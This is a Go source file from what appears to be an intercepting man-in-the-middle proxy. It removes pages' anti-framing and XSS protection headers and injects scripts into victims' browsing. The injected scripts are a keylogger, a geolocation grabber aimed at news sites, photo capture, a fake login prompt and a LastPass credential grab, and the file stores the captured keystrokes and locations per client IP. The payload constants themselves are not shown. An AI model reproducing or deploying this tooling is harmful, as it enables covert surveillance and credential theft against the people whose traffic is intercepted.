package controllers

import (
    "log"
    "bytes"
    "github.com/abourget/goproxy"
    "strings"
    "os"
    "io"
    "io/ioutil"
    "net/http"
)


// -----------------------------------------------------------------------------------------

//store keylogs for proxy session
var keylogs []KeyLog
//store locations for proxy session
var locations []Location
//proxy password
var password string

//key logger object
type KeyLog struct {
    Page string //what page they were on when they typed it
    IP string //which client typed it
    Content string //what was typed
    Timestamp string //the time at which it was typed
    DomObject string //where the data was typed
}
type Location struct {
    IP string
    Latitude string
    Longitude string
    Timestamp string
}
/*
struct for storing result from a filePath Walker
so that can return it to the user.
*/
type Walker struct {
    files []string
}
// -----------------------------------------------------------------------------------------


func utilsGetBuffer( site string ) string {
    buf := bytes.NewBuffer(nil)
    var s string
        f, err := os.Open(fileLocation+"/"+site+".html") // Error handling elided for brevity.
        if err != nil {
            log.Println("read error: ", err)
            // oooh recursive!
            s = utilsGetBuffer("notfound")
        } else {
            io.Copy(buf, f)           // Error handling elided for brevity.
            s = string(buf.Bytes())
        }
        f.Close()
    return s
}

//function removes headers that block cross site loading
func utilsModifyHeadersForInjection(ctx *goproxy.ProxyCtx) {
        ctx.Resp.Header.Del("X-Frame-Options")
        ctx.Resp.Header.Add("X-Frame-Options", "*" )
        ctx.Resp.Header.Del("X-Content-Type-Options")
        ctx.Resp.Header.Del("X-Xss-Protection")
        ctx.Resp.Header.Add("Access-Control-Allow-Origin", "*" )
} 

func utilsInjector(ctx *goproxy.ProxyCtx,  body string, replace string, result string ) string {
    if !strings.Contains(ctx.Req.URL.Host, "127.0.0.1") {
        body = strings.Replace(body, replace, result, -1)
    }
    return body
}


func utilsGetHTTPHeaders( body string, contentType string ) *http.Response {
    if contentType == "" {
        contentType = "text/html"
    }
    // Make the header.
    client_response_header := make(http.Header)
    client_response_header.Add("Content-Type", contentType )
    client_response := &http.Response{
        Status: "200 OK", // resp.Status,
        StatusCode: 200, // resp.StatusCode,
        Proto: "HTTP/1.1", // resp.Proto,
        ProtoMajor: 1, // resp.ProtoMajor,
        ProtoMinor: 1, // resp.ProtoMinor,
        Body: ioutil.NopCloser(bytes.NewBufferString(body)),
        Header: client_response_header,
        ContentLength: int64(len(body)),
    }
    return client_response
}
func (w *Walker) utilsDeletefiles(path string, f os.FileInfo, err error) (e error) {
    //must check for the directory otherwise end up deleting it!
    if !f.Mode().IsDir() {
         log.Println(path)
         w.files = append(w.files, path)
    }
    //put this back in when you actually do want to clear the currently collected list
    // os.Remove(path)
    return
 }

func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) {
            if globalInjectKeyLogger {
                log.Println("INJECTING Keylogger")
                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
            }
            if globalInjectGetLocation {
                for _, v := range (newsSites) {
                    if strings.Contains(ctx.Req.URL.Host, v) { //only inject if the page is a news site
                        log.Println("injecting into: ", v)
                        utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                        body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )        
                        break
                    }
                }
            }
            if globalInjectGetPhoto {
                log.Println("INJECTING Photo")
                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
            }
            if globalInjectGetLogin {
                log.Println("INJECTING Login")
                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
            }
            if globalInjectLastpass {
                log.Println("INJECTING Lastpass")
                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
            }
}
// -----------------------------------------------------------------------------------------

